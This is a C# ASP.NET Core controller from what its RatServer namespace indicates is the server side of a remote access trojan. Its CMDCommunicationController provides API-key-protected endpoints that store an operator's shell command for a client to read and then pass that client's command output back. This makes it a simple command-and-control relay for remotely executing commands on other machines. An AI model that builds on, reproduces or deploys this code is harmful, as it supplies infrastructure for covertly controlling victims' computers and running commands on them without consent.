using Microsoft.AspNetCore.Mvc;
using RatServer.Core.Filters;
using System.Threading.Tasks;

namespace RatServer.Controllers.Client
{
    [Route("api/[controller]")]
    [ApiController]
    public class CMDCommunicationController : ControllerBase
    {
        static protected string cmdIn = "";
        static protected string cmdOut = "";
        public CMDCommunicationController()
        {

        }


        [HttpGet(nameof(SendCmd))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SendCmd(string cmd)
        {
            cmdIn = cmd;
            return Ok(true); 
        }
        [HttpGet(nameof(ReadCmd))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> ReadCmd()
        {
            return Ok(cmdIn);
        }
        [HttpGet(nameof(ClearCmd))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> ClearCmd()
        {
            cmdIn = "";
            return Ok(true);
        }
        [HttpGet(nameof(SendOutput))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> SendOutput(string cmd)
        {
            cmdOut = cmd;
            return Ok(true); 
        }
        [HttpGet(nameof(ReadOutput))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> ReadOutput()
        {
            return Ok(cmdOut);
        }
        [HttpGet(nameof(ClearOutput))]
        [TypeFilter(typeof(ApiKeyAuthorizationFilter), Arguments = null)]
        public async Task<IActionResult> ClearOutput()
        {
            cmdOut = "";
            return Ok(true);
        }
    
    }

}
